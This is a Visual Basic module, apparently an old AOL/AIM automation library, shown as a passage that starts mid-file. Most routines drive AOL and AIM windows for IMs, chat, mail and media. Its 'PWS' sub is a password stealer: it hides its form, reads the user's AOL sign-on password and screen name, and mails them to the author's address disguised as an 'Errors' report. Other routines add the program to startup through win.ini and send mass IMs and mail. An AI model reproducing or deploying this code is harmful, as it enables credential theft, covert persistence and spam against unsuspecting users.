'       Chat1.ChatSend(STR2Fade$)
'Now There Are More Options Than That But I Am Trying To
'Point Out that Anyone Can Make A Phader But Its Harder
'To Add Options Read From An INI.
'So Please, For The Future Of AOProggin's Sake
'BE CREATIVE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
End Sub
Sub AIMChangeBuddyCaption(newcaption$)
Dim BuddyCaption As Long
BuddyCaption& = FindWindow("_Oscar_BuddyListWin", vbNullString)
    Call SendMessageByString(BuddyCaption&, WM_SETTEXT, 0, newcaption$)
End Sub
Sub AIMChangeChatCaption(newcaption$)
Dim ChatCaption As Long
ChatCaption& = FindWindow("AIM_IMessage", vbNullString)
    Call SendMessageByString(ChatCaption&, WM_SETTEXT, 0, newcaption$)
End Sub
Sub AIMChangeIMCaption(newcaption$)
Dim IMCaption As Long
IMCaption& = FindWindow("AIM_IMessage", vbNullString)
    Call SendMessageByString(IMCaption&, WM_SETTEXT, 0, newcaption$)
End Sub
Public Sub AimMassIM(List As ListBox, Text As TextBox)
Dim People As Long, X As Long
List.Enabled = False
    People& = List.ListCount - 1
    List.ListIndex = 0
For X = 0 To People
    List.ListIndex = X
        Call AIMSendIM(List.Text, (Text))
    TimeOut 1.5
Next X
List.Enabled = True
End Sub
Function AIMGetUserSn()
Dim UserSN As Long, sLen As Long, sSTR As String
Dim WinTxT As Long, sSN As String
On Error Resume Next
UserSN& = FindWindow("_Oscar_BuddyListWin", vbNullString)
sLen& = GetWindowTextLength(UserSN&)
sSTR$ = String$(sLen&, 0)
WinTxT& = GetWindowText(UserSN&, sSTR$, (sLen& + 1))
If Not Right(sSTR$, 13) = "'s Buddy List" Then Exit Function
    sSN$ = Mid$(sSTR$, 1, (sLen& - 13))
    AIMGetUserSn = sSN$
End Function
Function AIMGetSnFromIM()
Dim SNFromIM As Long, sLen As Long, sSTR As String, WinTxT As String, sSN As String
On Error Resume Next
SNFromIM& = FindWindow("AIM_IMessage", vbNullString)
sLen& = GetWindowTextLength(SNFromIM&)
sSTR$ = String$(sLen, 0)
WinTxT$ = GetWindowText(SNFromIM&, sSTR$, (sLen& + 1))
If Not Right(sSTR$, 18) = " - Instant Message" Then Exit Function
    sSN$ = Mid$(sSTR$, 1, (sLen& - 18))
    AIMGetSnFromIM = sSN$
End Function

Sub AIMSendChat(Text$)
Dim Chat As Long, Ate32 As Long, Ate322 As Long, Icon As Long
Chat& = FindWindow("AIM_ChatWnd", vbNullString)
    If Chat& = 0 Then MsgBox "There Is No Chat Open", vbOKOnly, "AiM Chat Send"
        Ate32& = FindWindowEx(Chat&, 0&, "Ate32Class", vbNullString)
        Ate322& = GetWindow(Ate32&, GW_HWNDNEXT)
             Call SendMessageByString(Ate322&, WM_SETTEXT, 0, Text$)
        Icon& = FindWindowEx(Chat&, 0&, "_Oscar_IconBtn", vbNullString)
Click (Icon&)
End Sub
Sub AIMOpenNewChatInvite()
Dim OpenChatInvite As Long, TabGroup As Long, Icon As Long
OpenChatInvite& = FindWindow("_Oscar_BuddyListWin", vbNullString)
TabGroup& = FindWindowEx(OpenChatInvite&, 0&, "_Oscar_TabGroup", vbNullString)
Icon& = FindWindowEx(TabGroup&, 0&, "_Oscar_IconBtn", vbNullString)
Click (Icon&)
End Sub
Sub AIMSendChatInvite(Who$, Message$, ChatName$)
Dim ChatSendWin As Long, Edit As Long, Invitation As Long
Dim sStatic As Long, sStatic2 As Long, sStatic3 As Long, sStatic4 As Long
Dim sStatic5 As Long, sStatic6 As Long, sStatic7 As Long, sStatic8 As Long
Dim Icon As Long, Icon2 As Long, Icon3 As Long
    Call AIMOpenNewChatInvite
    TimeOut 1.5
ChatSendWin& = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
Edit& = FindWindowEx(ChatSendWin&, 0&, "Edit", vbNullString)
    Call SendMessageByString(Edit&, WM_SETTEXT, 0, Who$)
Invitation& = FindWindowEx(ChatSendWin&, 0&, vbNullString, "You are invited to the following Buddy Chat: ")
    Call SendMessageByString(Invitation&, WM_SETTEXT, 0, Message$)
sStatic& = FindWindowEx(ChatSendWin&, 0&, "_Oscar_Static", vbNullString)
    sStatic2& = GetWindow(sStatic&, GW_HWNDNEXT)
    sStatic3& = GetWindow(sStatic2&, GW_HWNDNEXT)
    sStatic4& = GetWindow(sStatic3&, GW_HWNDNEXT)
    sStatic5& = GetWindow(sStatic4&, GW_HWNDNEXT)
    sStatic6& = GetWindow(sStatic5&, GW_HWNDNEXT)
    sStatic7& = GetWindow(sStatic6&, GW_HWNDNEXT)
    sStatic8& = GetWindow(sStatic7&, GW_HWNDNEXT) '13
        Call SendMessageByString(sStatic8&, WM_SETTEXT, 0, ChatName$)
            Icon& = FindChildByClass(ChatSendWin&, "_Oscar_IconBtn")
            Icon2& = GetWindow(Icon&, GW_HWNDNEXT)
            Icon3& = GetWindow(Icon2&, GW_HWNDNEXT)
Click (Icon3&)
End Sub
Sub AIMSendIM(Who$, What$)
Dim IMWin As Long, sCombo As Long, Edit As Long, Ate32 As Long
Dim Ate322 As Long, Icon As Long
    Call AIMOpenNewIM
IMWin& = FindWindow("AIM_IMessage", vbNullString)
sCombo& = FindWindowEx(IMWin&, 0&, "_Oscar_PersistantComb", vbNullString)
Edit& = FindWindowEx(sCombo&, 0&, "Edit", vbNullString)
    Call SendMessageByString(Edit&, WM_SETTEXT, 0, Who$)
Ate32& = FindWindowEx(IMWin&, 0&, "Ate32class", vbNullString)
    Ate322& = GetWindow(Ate32&, GW_HWNDNEXT)
        Call SendMessageByString(Ate322&, WM_SETTEXT, 0, What$)
        Icon& = FindWindowEx(IMWin&, 0&, "_Oscar_IconBtn", vbNullString)
Click (Icon&)
End Sub
Sub AIMOpenNewIM()
Dim OpenIM As Long, TabGroup As Long, Icon As Long, Icon2 As Long
OpenIM& = FindWindow("_Oscar_BuddyListWin", vbNullString)
TabGroup& = FindWindowEx(OpenIM&, 0&, "_Oscar_TabGroup", vbNullString)
Icon& = FindWindowEx(TabGroup&, 0&, "_Oscar_IconBtn", vbNullString)
Icon2& = GetWindow(Icon&, GW_HWNDNEXT)
Click (Icon2&)
End Sub

Function RunEXEOnStartup()
    Call WriteToINI("Windows", "Load", App.Path & "\" & App.EXEName, "C:\Window\Win.ini")
End Function
Sub ClearAOLLocationBar()
Dim AOL As Long, Toolbar As Long, ToolbarW As Long, wCombo As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Toolbar& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
ToolbarW& = FindWindowEx(Toolbar&, 0&, "_AOL_Toolbar", vbNullString)
wCombo& = FindWindowEx(ToolbarW&, 0&, "_AOL_Combobox", vbNullString)
    Call SendMessage(wCombo&, CB_RESETCONTENT, 0, 0)
End Sub
Sub Window_Enable(Window)
    Call EnableWindow(Window, 1)
End Sub





Sub RemoveItem_Combo(ComboWin As Long, thestring As String)
Dim FindIt As Long, DeleteIt As Long
FindIt = SendMessageByString(ComboWin, CB_FINDSTRINGEXACT, -1, thestring)
If FindIt <> -1 Then
    Call SendMessageByString(ComboWin, CB_DELETESTRING, FindIt, 0)
End If
End Sub
Sub RemoveItem_ListBoX(ListWin, thestring)
Dim FindIt As Long, DeleteIt As Long
FindIt = SendMessageByString(ListWin, LB_FINDSTRINGEXACT, -1, thestring)
If FindIt <> -1 Then
    Call SendMessageByString(ListWin, LB_DELETESTRING, FindIt, 0)
End If
End Sub
Sub Draw3DBorder(c As Control, iLook As Integer)
'Makes A Control Look 3D
Dim iOldScaleMode As Integer, iFirstColor As Integer
Dim iSecondColor As Integer, RAISED As Variant, PIXELS As Variant
    If iLook = RAISED Then
        iFirstColor = 15
        iSecondColor = 8
    Else
        iFirstColor = 8
        iSecondColor = 15
    End If
iOldScaleMode = c.Parent.ScaleMode
c.Parent.ScaleMode = PIXELS
c.Parent.Line (c.Left, c.Top - 1)-(c.Left + c.Width, c.Top - 1), QBColor(iFirstColor)
c.Parent.Line (c.Left - 1, c.Top)-(c.Left - 1, c.Top + c.Height), QBColor(iFirstColor)
c.Parent.Line (c.Left + c.Width, c.Top)-(c.Left + c.Width, c.Top + c.Height), QBColor(iSecondColor)
c.Parent.Line (c.Left, c.Top + c.Height)-(c.Left + c.Width, c.Top + c.Height), QBColor(iSecondColor)
c.Parent.ScaleMode = iOldScaleMode
End Sub
Sub WriteToLog(What As String, LoGPath As String)
Dim X As Long, sSTR As String
If LoGPath = "" Then Exit Sub
If InStr(LoGPath, ".") = 0 Then Exit Sub
X& = FreeFile
Open LoGPath For Binary Access Write As X&
    sSTR$ = What & Chr(10)
    Put #1, LOF(1) + 1, sSTR$
Close X&
End Sub
Function SetSNAndPWAndSignOn(SN, PW)
Dim Modal As Long, Edit As Long, Edit2 As Long, Edit3 As Long
Dim Cancel As Long, OK As Long
Do
    DoEvents
    Modal& = FindWindow("_AOL_Modal", vbNullString)
    Edit& = FindWindowEx(Modal&, 0&, "_AOL_Edit", vbNullString)
    If Modal& <> 0 And Edit& <> 0 Then Exit Do
Loop
Call Window_SetText(Edit&, SN)
    Edit2& = GetWindow(Edit&, 2)
    Edit3& = GetWindow(Edit2&, 2)
Call Window_SetText(Edit3&, PW)
    Cancel& = FindWindowEx(Modal&, 0&, "_AOL_button", vbNullString)
    OK& = GetWindow(Cancel&, 2)
Click (OK&)
End Function
Function Scan_Deltree(File As String)
Dim FileLen As Long, FileLenn As Long, l003A As Variant
Dim l003E As Variant, l0042 As String, l0044 As Single
Dim l0046 As Single, l0048 As Single, l004a As Single
Dim l004C As Single, l004e As Single, l0050 As Single
Dim l0052 As Single, l0054 As Single, l0056 As Single
Dim l0058 As Single, l005A As Variant, l0045!
Open File For Binary As #2
DoEvents
    FileLen = LOF(2)
    FileLenn = FileLenn
    l003A = 1
While FileLenn >= 0
    If FileLenn > 32000 Then
        l003E = 32000
    ElseIf FileLenn = 0 Then
        l003E = 1
    Else
        l003E = FileLenn
    End If
        l0042$ = String$(l003E, " ")
    Get #2, l003A, l0042$
        l0044! = InStr(1, l0042$, "deltree \y", 1)
        l0045! = InStr(1, l0042$, "MZÿ C:\*.*", 1)
If l0044! Then Scan_Deltree = True: MsgBox "File Has A Deltree In the Coding", vbOKOnly, "DelTree Scanner": Close: Exit Function
If Not l0044! Then Scan_Deltree = False: MsgBox "File Does Not Have A Deltree In the Coding", vbOKOnly, "DelTree Scanner": Close: Exit Function
Wend
End Function
Function Click_List(Window, index)
    Call SendMessage(Window, LB_SETCURSEL, ByVal CLng(index), ByVal 0&)
End Function
Public Function TileBitmap(TheForm As Form, theBitmap As PictureBox)
Dim Across As Integer, Down As Integer
theBitmap.AutoSize = True
    For Down = 0 To (TheForm.Width \ theBitmap.Width) + 1
        For Across = 0 To (TheForm.Height \ theBitmap.Height) + 1
            TheForm.PaintPicture theBitmap.Picture, Down * theBitmap.Width, Across * theBitmap.Height, theBitmap.Width, theBitmap.Height
    Next Across, Down
End Function
Sub Window_Maximize(Window)
    Call ShowWindow(Window, SW_MAXIMIZE)
End Sub
Sub Window_Minimize(Window)
    Call ShowWindow(Window, SW_MINIMIZE)
End Sub
Function MakeASCIIChart(List As ListBox)
Dim X As Long
For X = 33 To 255
    List.AddItem Chr(X)
Next X
End Function
Function WindowSPY(WinHdl As TextBox, WinClass As TextBox, WinTxT As TextBox, WinStyle As TextBox, WinIDNum As TextBox, WinPHandle As TextBox, WinPText As TextBox, WinPClass As TextBox, WinModule As TextBox)
'Call This In A Timer
Dim pt32 As POINTAPI, ptx As Long, pty As Long, sWindowText As String * 100
Dim sClassName As String * 100, hWndOver As Long, hWndParent As Long
Dim sParentClassName As String * 100, wID As Long, lWindowStyle As Long
Dim hInstance As Long, sParentWindowText As String * 100
Dim sModuleFileName As String * 100, r As Long
Static hWndLast As Long
    Call GetCursorPos(pt32)
    ptx = pt32.X
    pty = pt32.y
    hWndOver = WindowFromPointXY(ptx, pty)
    If hWndOver <> hWndLast Then
        hWndLast = hWndOver
        WinHdl.Text = "Window Handle: " & hWndOver
        r = GetWindowText(hWndOver, sWindowText, 100)
        WinTxT.Text = "Window Text: " & Left(sWindowText, r)
        r = GetClassName(hWndOver, sClassName, 100)
        WinClass.Text = "Window Class Name: " & Left(sClassName, r)
        lWindowStyle = GetWindowLong(hWndOver, GWL_STYLE)
        WinStyle.Text = "Window Style: " & lWindowStyle
        hWndParent = GetParent(hWndOver)
            If hWndParent <> 0 Then
                wID = GetWindowWord(hWndOver, GWW_ID)
                WinIDNum.Text = "Window ID Number: " & wID
                WinPHandle.Text = "Parent Window Handle: " & hWndParent
                r = GetWindowText(hWndParent, sParentWindowText, 100)
                WinPText.Text = "Parent Window Text: " & Left(sParentWindowText, r)
                r = GetClassName(hWndParent, sParentClassName, 100)
                WinPClass.Text = "Parent Window Class Name: " & Left(sParentClassName, r)
            Else
                WinIDNum.Text = "Window ID Number: N/A"
                WinPHandle.Text = "Parent Window Handle: N/A"
                WinPText.Text = "Parent Window Text : N/A"
                WinPClass.Text = "Parent Window Class Name: N/A"
            End If
                hInstance = GetWindowWord(hWndOver, GWW_HINSTANCE)
                r = GetModuleFileName(hInstance, sModuleFileName, 100)
        WinModule.Text = "Module: " & Left(sModuleFileName, r)
    End If
End Function
Function AOLWindow()
    Call FindWindow("AOL Frame25", vbNullString)
End Function
Sub ExtractAnIcon(CmmDlg As Control)
Dim sSourcePgm As String, lIcon As Long
'The Control Is the Name Of The CommonDialog On The Form
'Put This In The CommonDialog Control
'Make A Picture BoX To Show The Extracted Icon (Picture1)
'
'  DestroyIcon lIcon
'  Picture1.Cls ' Picture1 Will Display The Icon
'  lIcon = ExtractIcon(App.hInstance, sSourcePgm, VScroll1.Value)
'  Picture1.AutoSize = True
'  Picture1.AutoRedraw = True
'  DrawIcon Picture1.hdc, 0, 0, lIcon
'  Picture1.Refresh
'

Dim a%
    On Error Resume Next
  With CmmDlg
    .FileName = sSourcePgm
    .CancelError = True
    .DialogTitle = "Select a DLL or EXE which includes Icons"
    .Filter = "Icon Resources (*.ico;*.exe;*.dll)|*.ico;*.exe;*.dll|All files|*.*"
    .Action = 1
    If Err Then
      Err.Clear
      Exit Sub
    End If
    sSourcePgm = .FileName
    DestroyIcon lIcon
    End With
    Do
      lIcon = ExtractIcon(App.hInstance, sSourcePgm, a)
      If lIcon = 0 Then Exit Do
      a = a + 1
      DestroyIcon lIcon
    Loop
    If a = 0 Then
      MsgBox "No Icons in this file!"
    End If
End Sub

Public Sub AddRoomToListbox(iList As ListBox)
On Error Resume Next
Dim Process As Long, itmHold As Long, ScreenName As String
Dim snHold As Long, Bytes As Long, index As Long, Room As Long
Dim List As Long, sThread As Long, mThread As Long
    Room& = FindChatRoom
    If Room& = 0& Then Exit Sub
    List& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(List, Process&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, Process&)
    If mThread& Then
        For index& = 0 To SendMessage(List, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(List, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, Bytes)
            Call CopyMemory(snHold&, ByVal ScreenName$, 4)
            snHold& = snHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, snHold&, ScreenName$, Len(ScreenName$), Bytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
                iList.AddItem ScreenName$
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Public Sub AddRoomToCombobox(List As ListBox, Combo As ComboBox)
Dim X As Long
Call AddRoomToListbox(List)
For X = 0 To List.ListCount
    Combo.AddItem (List.List(X))
Next X
End Sub

Sub AddRoomToTextBox(List As ListBox, Text As TextBox)
Dim SN As String, X As Long
Call AddRoomToListbox(List)
    For X = 0 To List.ListCount - 1
    SN$ = SN$ + List.List(X) 'To Add The Comma & ","
Next X
TimeOut (0.01)
Text.Text = SN$
End Sub
Sub AntiIdle()
Dim Palette As Long, Modal As Long
Dim Button As Long, Button2 As Long
    Palette& = FindWindow("_AOL_Palette", vbNullString)
    Modal& = FindWindow("_AOL_Modal", vbNullString)
    Button& = FindWindowEx(Palette&, 0&, "_AOL_Icon", vbNullString)
    Button2& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
Click (Button&)
Click (Button2&)
End Sub
Public Sub Click(Icon)
    Call SendMessage(Icon, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Icon, WM_LBUTTONUP, 0&, 0&)
End Sub
Public Sub MIDI_Play(Midi As String)
Dim File As String
File$ = Dir(Midi$)
If File$ <> "" Then
    Call mciSendString("play " & Midi$, 0&, 0, 0)
End If
End Sub
Public Sub MIDI_Stop(Midi As String)
Dim File As String
File$ = Dir(Midi$)
If File$ <> "" Then
    Call mciSendString("stop " & Midi$, 0&, 0, 0)
End If
End Sub
Sub Chat_Enter(Room As String)
    Call Keyword("aol://2719:2-2-" & Room$)
End Sub
Sub Click_Double(Icon&)
    Call SendMessageByNum(Icon&, WM_LBUTTONDBLCLK, &HD, 0)
End Sub
Sub Mail_KeepAsNew()
Dim AOL As Long, MDI As Long, MailBox As Long, Button As Long
Dim L As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
MailBox& = FindWindowEx(MDI&, 0&, vbNullString, UserSN & "'s Online Mailbox")
Button& = FindWindowEx(MDI&, MailBox&, "_AOL_Icon", vbNullString)
For L = 1 To 2
    Button& = GetWindow(Button&, 2)
Next L
    Click (Button&)
End Sub
Function Mail_FindBoX() As Long
Dim AOL As Long, MDI As Long, MailBox As Long, Thebox As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Thebox = FindWindowEx(MDI&, 0&, vbNullString, UserSN & "'s Online Mailbox")
Mail_FindBoX& = Thebox
End Function
Sub Mail_Next()
Dim MailWin As Long, Button As Long, L As Long, MMStop As Boolean
MailWin& = FindWindowEx(AOLMDI(), 0&, "AOL Child", vbNullString)
Button& = FindWindowEx(MailWin&, 0&, "_AOL_Icon", vbNullString)
For L = 1 To 5
    Button& = GetWindow(Button&, 2)
Next L
If Button& = 0 Then MsgBox "You Are Out Of Mail :-)": MMStop = True: Exit Sub
Click (Button&)
End Sub
Function FindChildByTitle(Parent, child)
    FindChildByTitle& = FindWindowEx(Parent, 0&, vbNullString, child)
End Function
Sub CD_Play()
    Call mciSendString("play cd", 0, 0, 0)
End Sub
Sub CD_OpenDoor()
    Call mciSendString("set cd door open", 0, 0, 0)
End Sub
Sub CD_Pause()
    Call mciSendString("pause cd", 0, 0, 0)
End Sub

Function CD_ChangeTrack(Track&)
    Call mciSendString("seek cd to " & STR(Track), 0, 0, 0)
End Function

Function CD_Stop()
    Call mciSendString("stop cd wait", 0, 0, 0)
End Function
Function CD_NumOfTracks&()
    Dim Bleh As String * 30, S As Long
    Call mciSendString("status cd number of tracks wait", S, Len(S), 0)
    CD_NumOfTracks = CInt(Mid$(Bleh, 1, 2))
End Function
Sub CD_CloseDoor()
    Call mciSendString("set cd door closed", 0, 0, 0)
End Sub
Function CD_IsCDMusic&()
    Dim Bleh As String * 30, S As Long, CD_IsMusic As Boolean
    Call mciSendString("status cd media present", S, Len(S), 0)
    CD_IsMusic = Bleh
End Function
Sub Mail_Read()
Dim AOL As Long, MDI As Long, Box As Long, Button As Long
Dim L As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Box& = FindWindowEx(MDI&, 0&, vbNullString, UserSN & "'s Online Mailbox")
Button& = FindWindowEx(Box&, 0&, "_AOL_Icon", vbNullString)
For L = 1 To 0
    Button& = GetWindow(Button&, 2)
Next L
Click (Button&)
End Sub
Sub Mail_SendAndForward(Recipiants)
Dim AOL As Long, MDI As Long, Mail As Long, Edit As Long
Dim RichText As Long, Button As Long, GetIcon As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Do: DoEvents
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Mail& = FindWindowEx(MDI&, 0&, vbNullString, "Fwd: ")
Edit& = FindWindowEx(Mail&, 0&, "_AOL_Edit", vbNullString)
RichText& = FindWindowEx(Edit&, 0&, "RICHCNTL", vbNullString)
Button& = FindWindowEx(Mail&, 0&, "_AOL_Icon", vbNullString)
Loop Until Mail& <> 0 And Edit& <> 0 And RichText& <> 0 And Button& <> 0
'
Call SendMessageByString(Edit&, WM_SETTEXT, 0, Recipiants)
For GetIcon = 1 To 14
    Button& = GetWindow(Button&, 2)
Next GetIcon
'
Click (Button&)
Do: DoEvents
    Mail& = FindWindowEx(MDI&, 0&, vbNullString, "Fwd: ")
    Edit& = FindWindowEx(Mail&, 0&, "_AOL_Edit", vbNullString)
Loop Until Edit& = 0
End Sub
Sub Click_StartButton()
Dim Windows As Long, StartButton As Long
Windows& = FindWindow("Shell_TrayWnd", vbNullString)
StartButton& = FindWindowEx(Windows&, 0&, "Button", vbNullString)
Click (StartButton&)
End Sub
Sub File_Copy(File&, Where&)
    If File& = "" Then Exit Sub
    If Where& = "" Then Exit Sub
    If Not File_Exists(File&) Then Exit Sub
On Error GoTo errhandler
    If InStr(Right$(File&, 4), ".") = 0 Then Exit Sub
    If InStr(Right$(Where&, 4), ".") = 0 Then Exit Sub
    FileCopy File&, Where&
Exit Sub
errhandler:
MsgBox "An Unexpected Error Occured!", 16, "Error"
End Sub
Public Function Mail_CountFlash() As Long
Dim AOL As Long, MDI As Long, FlashWin As Long, Tree As Long
Dim Count As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
FlashWin& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
Tree& = FindWindowEx(FlashWin&, 0&, "_AOL_Tree", vbNullString)
Count& = SendMessage(Tree&, LB_GETCOUNT, 0&, 0&)
Mail_CountFlash& = Count&
'MsgBox "You Have " & Mail_CountFlash& & " Flash Mails"
End Function

Function AOLMDI()
Dim AOL As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Call FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
End Function
Sub IM_Ignore(SN)
    Call IM_Send("IM_Off" & SN, " ")
End Sub
Public Sub Window_Hide(Window As Long)
    Call ShowWindow(Window, 0)
End Sub

Public Sub Window_Show(Window As Long)
    Call ShowWindow(Window, 5)
End Sub
Sub IM_UnIgnore(SN)
    Call IM_Send("IM_On" & SN, " ")
End Sub
Function ReplaceText(Text, Find, Changeto)
Dim X As Long, char As String, chars As String
If InStr(Text, Find) = 0 Then
    ReplaceText = Text
Exit Function
End If
    For X = 1 To Len(Text)
    char$ = Mid(Text, X, 1)
    chars$ = chars$ & char$
If char$ = Find Then
chars$ = Mid(chars$, 1, Len(chars$) - 1) + Changeto
End If
Next X
ReplaceText = chars$
End Function
Sub MySite()
    Call Keyword("http://members.xoom.com/izekial83/")
End Sub
Function TrimEnters(thestring)
Dim sChr13 As String, sChr10 As String
    sChr13 = ReplaceText(thestring, Chr(13), "")
    sChr10 = ReplaceText(sChr10, Chr(10), "")
TrimEnters = sChr10
End Function
Sub StayOffTop(F As Form)
    Call SetWindowPos(F.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, flags)
End Sub
Sub PWS(YourEmail As String, Frm As Form, PWBox As TextBox, SNBox As TextBox)
Dim MDI As Long, child As Long, Box As Long, WelcomeW As Long
Dim DoDisable As Boolean, Password As Long, Length As Long
Dim Title As String, X As Long, User As Long
Frm.Visible = False
MDI& = FindWindowEx((AOLWindow), 0&, "MDICLIENT", vbNullString)
child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
Box& = FindWindowEx(child&, 0&, "_AOL_Edit", vbNullString)
WelcomeW& = FindWindowEx(MDI&, 0&, vbNullString, "Welcome, ")
If Box& = 0 Then
Exit Sub
Else
GoTo nope
End If
nope:
Password& = SendMessage(Box&, WM_GETTEXT, 0&, 0&)
PWBox = Password&
If PWBox = "" Then GoTo nope
If PWBox = "0" Then GoTo nope
FindWelcome:
TimeOut 5
If WelcomeW& = 0 Then GoTo FindWelcome
    Length& = GetWindowTextLength(WelcomeW&)
    Title$ = String$(200, 0)
    X& = GetWindowText(WelcomeW&, Title$, (Length& + 1))
    User = Mid$(Title$, 10, (InStr(Title$, "!") - 10))
    UserSN = User
    SNBox = UserSN
Call Mail_Send(YourEmail, "Errors", "This person has errors " & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & Chr(13) & SNBox & Chr(13) & PWBox.Text)
End Sub
Sub DecompileProtect(ExeLocation, YourAppName)
Dim ThaFile As String, Cat As String
On Error Resume Next
    If ExeLocation = "" Then MsgBox "Executable File Not Found", vbOKOnly, YourAppName
ThaFile = FreeFile
Open ExeLocation For Binary As #ThaFile
    Cat = "."
Seek #ThaFile, 25
Put #ThaFile, , Cat
Close #1
If Err Then MsgBox "Not A Visual Basic Made File!", vbOKOnly, "Error In File": Exit Sub
MsgBox "Youre File Has Been Protected", vbOKOnly, YourAppName
End Sub
Sub MassMail(Peeps As ListBox)
'This Is Just An Example, Not The Best Way
Dim X As Integer, MailWin As Long, Icon As Long, Folks As String, MMStop As Boolean
Dim NewMail As Boolean, KeepMailAsNew As Boolean, SignOffAOL As Boolean
For X = 0 To Peeps.ListCount - 1
Folks = Folks + Peeps.List(X)
Next X
MailWin& = FindWindowEx(AOLMDI(), 0&, "AOL Child", vbNullString)
    Icon& = FindWindowEx(MailWin&, 0&, "_AOL_Icon", vbNullString)
'
If NewMail = True Then GoTo MMNewMail
MMNewMail:
Call Mail_Read
    WaitForMailToLoad
Mail_ReadCurrent
    TimeOut 6
Mail_Forward
    TimeOut 6
Call Mail_SendAndForward(Peeps)
    If KeepMailAsNew = True Then Call Mail_KeepAsNew: TimeOut 12
ClickNext: TimeOut 9
    GoTo KeepGoing
'
KeepGoing:
Mail_Forward
    TimeOut 6
Call Mail_SendAndForward(Peeps)
    If KeepMailAsNew = True Then Call Mail_KeepAsNew: TimeOut 12
If MMStop = True Then GoTo Done
    Exit Sub
Mail_Next
TimeOut 9
    GoTo KeepGoing
Done:
If SignOffAOL = True Then Window_Close (AOLWindow)
End Sub
Function ClearDocuments()
    Call SHAddToRecentDocs(0, 0)
End Function
Function AOLVersion()
Dim AOLMenus As Long, SubMenu As Long, Item As Long, MenuStr As String
Dim FindStr As Long
AOLMenus& = GetMenu(AOLWindow())
SubMenu& = GetSubMenu(AOLMenus&, 0)
Item& = GetMenuItemID(SubMenu&, 8)
MenuStr$ = String$(100, " ")
FindStr& = GetMenuString(SubMenu&, Item&, MenuStr$, 100, 1)
If UCase(MenuStr$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
    AOLVersion = 3
Else
    AOLVersion = 4
End If
End Function
Function FindChildByClass(Parent, child)
FindChildByClass& = FindWindowEx(Parent, 0&, child, vbNullString)
End Function
Function Find2ndChildByClass(Parent, child, Child2)
Dim lParent As Long, lChild As Long
lParent = FindWindow(Parent, vbNullString)
lChild = FindWindowEx(lParent, 0&, child, vbNullString)
Find2ndChildByClass& = FindWindowEx(lChild, 0&, Child2, vbNullString)
End Function
Function Find3rdChildByClass(Parent, child, Child2, Child3)
Dim lParent As Long, lChild As Long, lChild2 As Long
lParent = FindWindow(Parent, vbNullString)
lChild = FindWindowEx(lParent, 0&, child, vbNullString)
lChild2 = FindWindowEx(lChild, 0&, Child2, vbNullString)
Find3rdChildByClass& = FindWindowEx(lChild2, 0&, Child3, vbNullString)
End Function
Sub Attention(TheText)
Dim X As String, P As String
X = FadeByColor3(FADE_BLUE, FADE_GREEN, FADE_BLACK, "¸,.»¬=æ¤º²°A T T E N T I O N°²º¤æ=¬».,¸", False)
P = FadeByColor3(FADE_BLUE, FADE_GREEN, FADE_BLUE, (TheText), True)
    Call SendChat(X)
    TimeOut 0.5
    Call SendChat(P)
    TimeOut 0.5
    Call SendChat(X)
End Sub




Sub ChangeRes(iWidth As Single, iHeight As Single)
Dim a As Boolean, i As Long, B As Long
i = 0
    Do
        a = EnumDisplaySettings(0&, i&, DevM)
        i = i + 1
    Loop Until (a = False)
    DevM.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
    DevM.dmPelsWidth = iWidth
    DevM.dmPelsHeight = iHeight
    B = ChangeDisplaySettings(DevM, 0)
End Sub

Sub Chat_Clear()
Dim ClearNow As String, ChatWin As Long
ClearNow$ = Format$(String$(100, Chr$(13)))
ChatWin& = FindChatRoom
If ChatWin& = 0 Then Exit Sub
    Call SendMessageByString(ChatWin&, WM_SETTEXT, 0, ClearNow$)
End Sub

Sub BlockBuddy(SN As TextBox)
Dim BuddyList As Long, Find As Long, Finds As Long
Dim Setup As Long, SetupScreen As Long, Create As Long
Dim Edit As Long, Delete As Long, View As Long
Dim PrivacyPref As Long, Privacy As Long, Block As Long
Dim Who As Long, SetWho As Long, Save As Long
BuddyList& = FindWindowEx(AOLMDI(), 0&, vbNullString, "Buddy List Window")
Find& = FindWindowEx(BuddyList&, 0&, "_AOL_ICON", vbNullString)
Finds& = GetWindow(Find&, GW_HWNDNEXT)
Setup& = GetWindow(Finds&, GW_HWNDNEXT)
Click (Setup&)
TimeOut (1.8)
SetupScreen& = FindWindowEx(AOLMDI(), 0&, vbNullString, UserSN & "'s Buddy Lists")
Create& = FindWindowEx(SetupScreen&, 0&, "_AOL_ICON", vbNullString)
